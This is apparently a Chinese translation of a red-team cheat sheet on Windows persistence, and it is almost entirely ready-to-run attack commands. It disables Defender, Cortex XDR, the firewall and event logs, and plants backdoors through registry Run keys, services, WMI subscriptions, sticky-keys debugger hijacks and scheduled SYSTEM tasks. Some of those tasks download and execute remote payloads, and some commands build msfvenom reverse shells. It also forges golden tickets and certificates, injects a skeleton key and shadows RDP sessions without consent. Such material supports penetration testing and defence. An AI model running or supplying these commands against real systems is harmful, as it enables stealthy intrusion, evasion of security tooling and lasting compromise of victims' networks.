# Windows - 权限维持

## 摘要

* [工具](#tools)
* [隐藏你的二进制文件](#hide-your-binary)
* [禁用杀毒软件和安全](#disable-antivirus-and-security)
  * [杀毒软件移除](#antivirus-removal)
  * [禁用Windows Defender](#disable-windows-defender)
  * [禁用Windows防火墙](#disable-windows-firewall)
  * [清除系统和安全日志](#clear-system-and-security-logs)
* [简单用户](#simple-user)
  * [注册表HKCU](#registry-hkcu)
  * [启动](#startup)
  * [计划任务用户](#scheduled-tasks-user)
  * [BITS作业](#bits-jobs)
* [服务领域](#serviceland)
  * [IIS](#iis)
  * [Windows服务](#windows-service)
* [提升权限](#elevated)
  * [注册表HKLM](#registry-hklm)
    * [Winlogon辅助DLL](#)
    * [全局标志](#)
  * [提升启动](#startup-elevated)
  * [提升服务](#services-elevated)
  * [提升计划任务](#scheduled-tasks-elevated)
  * [二进制替换](#binary-replacement)
    * [在Windows XP+上的二进制替换](#binary-replacement-on-windows-xp)
    * [在Windows 10+上的二进制替换](#binary-replacement-on-windows-10)
  * [RDP后门](#rdp-backdoor)
    * [utilman.exe](#utilman.exe)
    * [sethc.exe](#sethc.exe)
  * [远程桌面服务影子](#remote-desktop-services-shadowing)
  * [万能钥匙](#skeleton-key)
  * [虚拟机](#virtual-machines)
  * [Windows子系统 for Linux](#windows-subsystem-for-linux)
* [域](#domain)
  * [金证书](#golden-certificate)
  * [金票](#golden-ticket)
* [参考资料](#references)


## 工具

- [SharPersist - 用C#编写的Windows持久性工具包。 - @h4wkst3r](https://github.com/fireeye/SharPersist)

## 隐藏你的二进制文件

> 设置(+)或清除(-)隐藏文件属性。如果文件使用此属性设置，您必须清除该属性，然后才能更改文件的其他任何属性。

```ps1
PS> attrib +h mimikatz.exe
```

## 禁用杀毒软件和安全

### 杀毒软件移除

* [Sophos Removal Tool.ps1](https://github.com/ayeskatalas/Sophos-Removal-Tool/)

* [Symantec CleanWipe](https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html)

* [Elastic EDR/Security](https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html)

  ```ps1
  cd "C:\Program Files\Elastic\Agent\"
  PS C:\Program Files\Elastic\Agent> .\elastic-agent.exe uninstall
  Elastic Agent将从您的系统中卸载，位置在C:\Program Files\Elastic\Agent。是否继续？[Y/n]:Y
  Elastic Agent已被卸载。
  ```

* [Cortex XDR](https://mrd0x.com/cortex-xdr-analysis-and-bypass/)

  ```ps1
  # 全局卸载密码：Password1
  密码哈希位于C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
  查找PasswordHash、PasswordSalt或password, salt字符串。
  
  # 禁用Cortex：将DLL更改为随机值，然后重启
  reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
  
  # 禁用启动时的代理（需要重启才能生效）
  cytool.exe startup disable
  
  # 禁用Cortex XDR文件、进程、注册表和服务的保护
  cytool.exe protect disable
  
  # 禁用Cortex XDR（即使启用了篡改保护）
  cytool.exe runtime disable
  
  # 禁用事件收集
  cytool.exe event_collection disable
  ```

### 禁用Windows Defender

```powershell
# 禁用Defender
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

## 排除进程/位置
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# 禁用扫描所有下载的文件和附件，禁用AMSI（反应式）
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
# 禁用AMSI（设置为0以启用）
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# 盲目ETW Windows Defender：清零对应于其ETW会话的注册表值
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

# 清除当前存储的定义
# MpCmdRun.exe的位置：C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
MpCmdRun.exe -RemoveDefinitions -All

# 移除签名（如果有互联网连接，它们将被再次下载）：
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# 禁用Windows Defender安全中心
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

# 禁用实时保护
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
```


### 禁用Windows防火墙

```powershell
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# IP白名单
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```

### 清除系统和安全日志

```powershell
cmd.exe /c wevtutil.exe cl System
cmd.exe /c wevtutil.exe cl Security
```

## 简单用户

将文件设置为隐藏

```powershell
attrib +h c:\autoexec.bat
```

### 注册表HKCU

在HKCU\Software\Microsoft\Windows内的Run键下创建一个REG_SZ值。

```powershell
值名称：  Backdoor
值数据：  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
```

使用命令行

```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
```

使用SharPersist

```powershell
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
```

### 启动

在用户启动文件夹中创建批处理脚本。

```powershell
PS C:\> gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
```

使用 SharPersist

```powershell
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
```

### 计划任务用户

* 使用原生 **schtask** - 创建新任务

  ```powershell
  # 创建一次性在00:00运行的预定任务
  schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
  # 立即强制运行它！
  schtasks /run /tn "Device-Synchronize"
  ```

* 使用原生 **schtask** - 利用 `schtasks /change` 命令修改现有计划任务

  ```powershell
  # 通过调用 ShellExec_RunDLL 函数来启动可执行文件。
  SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
  ```

* 使用 Powershell

  ```powershell
  PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
  PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
  PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
  PS C:\> $S = New-ScheduledTaskSettingsSet
  PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
  PS C:\> Register-ScheduledTask Backdoor -InputObject $D
  ```

* 使用 SharPersist

  ```powershell
  # 添加到当前计划任务
  SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
  
  # 添加新任务
  SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
  SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
  ```

### BITS 任务

```powershell
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"

# v1
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor

# v2 - exploit/multi/script/web_delivery
bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
bitsadmin /resume backdoor
```

## Serviceland

### IIS

IIS Raid – 使用原生模块后门化 IIS

```powershell
$ git clone https://github.com/0x09AL/IIS-Raid
$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```

### Windows 服务

使用 SharPersist

```powershell
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
```

## 提升权限

### 注册表 HKLM

与 HKCU 类似。在 HKLM\Software\Microsoft\Windows 的 Run 键下创建一个 REG_SZ 值。

```powershell
值名称：  Backdoor
值数据：  C:\Windows\Temp\backdoor.exe
```

使用命令行

```powershell
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
```

#### Winlogon 辅助 DLL

> 在 Windows 登录时运行可执行文件

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
```


#### GlobalFlag

> 在记事本被杀死后运行可执行文件

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
otepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
otepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
otepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
```

### 提升权限的启动

在用户启动文件夹中创建批处理脚本。

```powershell
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
```

### 提升权限的服务

创建一个将自动或按需启动的服务。

```powershell
# Powershell
New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
sc start pentestlab

# SharPersist
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add

# sc
sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
sc start Backdoor
```

### 提升权限的计划任务

以 SYSTEM 身份运行的预定任务，每天上午 9 点或在特定日子运行。

> 作为计划任务生成的进程，其父母进程为 taskeng.exe

```powershell
# Powershell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\backdoor.exe"
$T = New-ScheduledTaskTrigger -Daily -At 9am
# OR
$T = New-ScheduledTaskTrigger -Daily -At "9/30/2020 11:05:00 AM"
$P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
$S = New-ScheduledTaskSettingsSet
$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
Register-ScheduledTask "Backdoor" -InputObject $D

# Native schtasks
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
schtasks /Create /RU "NT AUTHORITY\SYSTEM" /tn [TaskName] /tr "regsvr32.exe -s \"C:\Users\*\AppData\Local\Temp\[payload].dll\"" /SC ONCE /Z /ST [Time] /ET [Time]

##(X86) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
 
##(X86) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
 
##(X86) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 
##(X64) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
 
##(X64) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
 
##(X64) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
```

### Windows 管理工具事件订阅

> 敌手可以使用Windows管理工具（WMI）来安装事件过滤器、提供者、消费者和绑定，在定义的事件发生时执行代码。敌手可能会利用WMI的功能订阅事件，并在该事件发生时执行任意代码，从而在系统上实现持久化。


* **__EventFilter**：触发器（新进程、登录失败等）
* **EventConsumer**：执行动作（执行有效载荷等）
* **__FilterToConsumerBinding**：绑定过滤器和消费者类

```ps1
# 使用CMD：在Windows启动后60秒执行二进制文件
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="WMIPersist", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WMIPersist", ExecutablePath="C:\Windows\System32\binary.exe",CommandLineTemplate="C:\Windows\System32\binary.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WMIPersist\"", Consumer="CommandLineEventConsumer.Name=\"WMIPersist\""
# 移除它
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='WMIPersist'" | Remove-WmiObject -Verbose

# 使用Powershell（部署）
$FilterArgs = @{name='WMIPersist'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 90"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate="$($Env:SystemRoot)\System32\binary.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
# 使用Powershell（移除）
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'WMIPersist'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'WMIPersist'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```


### 二进制替换

#### Windows XP+上的二进制替换

| 功能       | 可执行文件                            |
| ---------- | ------------------------------------- |
| 粘滞键     | C:\Windows\System32\sethc.exe         |
| 无障碍菜单 | C:\Windows\System32\utilman.exe       |
| 屏幕键盘   | C:\Windows\System32\osk.exe           |
| 放大镜     | C:\Windows\System32\Magnify.exe       |
| 讲述人     | C:\Windows\System32\Narrator.exe      |
| 显示切换器 | C:\Windows\System32\DisplaySwitch.exe |
| 应用切换器 | C:\Windows\System32\AtBroker.exe      |

在Metasploit中：`use post/windows/manage/sticky_keys`

#### Windows 10+上的二进制替换

利用屏幕键盘**osk.exe**可执行文件中的DLL劫持漏洞。

在`C:\Program Files\Common Files\microsoft shared\ink\`目录下创建恶意**HID.dll**文件。


### RDP后门

#### utilman.exe

在登录界面，按下Windows键+U，你将获得一个以SYSTEM权限运行的cmd.exe窗口。

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

#### sethc.exe

在RDP登录界面多次按F5。

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

### 远程桌面服务影子

:warning: FreeRDP和rdesktop不支持远程桌面服务影子功能。

要求：

* RDP必须运行

```powershell
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4
# 4 – 在未经用户许可的情况下查看会话。

# 允许远程连接到这台计算机
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


# 禁用UAC远程限制
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
# /v参数用于指定{ADDRESS}值，该值是远程主机的IP地址或主机名；
# /shadow参数用于指定{SESSION_ID}值，该值是被影子会话的会话ID；
# /noconsentprompt参数允许绕过被影子用户的权限，在未经其同意的情况下影子他们的会话；
# /prompt参数用于指定连接到远程主机的用户凭据。
```

### 骨架钥匙

> 向域控制器的LSASS进程中注入主密码。

要求：

* 域管理员（SeDebugPrivilege）或`NTAUTHORITY\SYSTEM`

```powershell
# 执行骨架钥匙攻击
mimikatz "privilege::debug" "misc::skeleton"
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>

# 使用密码“mimikatz”访问
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```


### 虚拟机

> 基于Shadow Bunny技术。

```ps1
# 下载virtualbox
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe

# 执行静默安装并避免创建桌面和快速启动图标
VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0

# 在\Program Files\Oracle\VirtualBox\VBoxManage.exe中
# 禁用通知
.\VBoxManage.exe setextradata global GUI/SuppressMessages "all" 

# 下载虚拟机磁盘
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd

# 创建新的VM
$vmname = "IT Recovery"
.\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register

# 添加NAT模式的网络适配器
.\VBoxManage.exe modifyvm $vmname --ioapic on  # 对于64位系统是必需的
.\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
.\VBoxManage.exe modifyvm $vmname --nic1 nat
.\VBoxManage.exe modifyvm $vmname --audio none
.\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
.\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"

# 挂载VHD文件
.\VBoxManage.exe storagectl $vmname -name "SATA Controller" -add sata
.\VBoxManage.exe storageattach $vmname -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0

# 启动VM
.\VBoxManage.exe startvm $vmname –type headless 


# 可选 - 添加共享文件夹
# 需要：VirtualBox Guest Additions
.\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount
# 然后在VM中挂载文件夹
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c
```

### Windows子系统 for Linux

```ps1
# 列出并安装在线软件包
wsl --list --online
wsl --install -d kali-linux

# 使用本地软件包
wsl --set-default-version 2
curl.exe --insecure -L -o debian.appx https://aka.ms/wsl-debian-gnulinux
Add-AppxPackage .\debian.appx

# 以root身份运行机器
wsl kali-linux --user root
```

## 域

### 用户证书

```ps1
# 为用户模板请求证书
.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User

# 将证书转换为Rubeus格式
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# 使用证书请求TGT
.\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
```

### 金钥匙证书

> 需要在Active Directory中或ADCS机器上提升权限

* 导出CA为p12文件：`certsrv.msc` > `右击` > `备份CA...`

* 替代方案1：使用Mimikatz提取证书为PFX/DER

  ```ps1
  privilege::debug
  crypto::capi
  crypto::cng
  crypto::certificates /systemstore:local_machine /store:my /export
  ```

* 替代方案2：使用SharpDPAPI，然后转换证书：`openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`

* [ForgeCert](https://github.com/GhostPack/ForgeCert) - 使用CA证书为任何活跃域用户伪造证书

  ```ps1
  ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
  ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
  ```

* 最后，您可以使用证书请求TGT

  ```ps1
  Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
  ```

### 金票

> 使用Mimikatz伪造金票

```ps1
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

### LAPS持久性

为了防止机器更新其LAPS密码，可以将更新日期设置为未来。

```ps1
Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

## 参考资料

* [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
* [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
* [IIS Raid – Backdooring IIS Using Native Modules - 19/02/2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
* [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)
* [Persistence - Checklist - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)
* [Persistence – Winlogon Helper DLL - @netbiosX](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)
* [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
* [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
* [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
* [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
* [Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)
* [Persistence via WMI Event Subscription - Elastic Security Solution](https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html)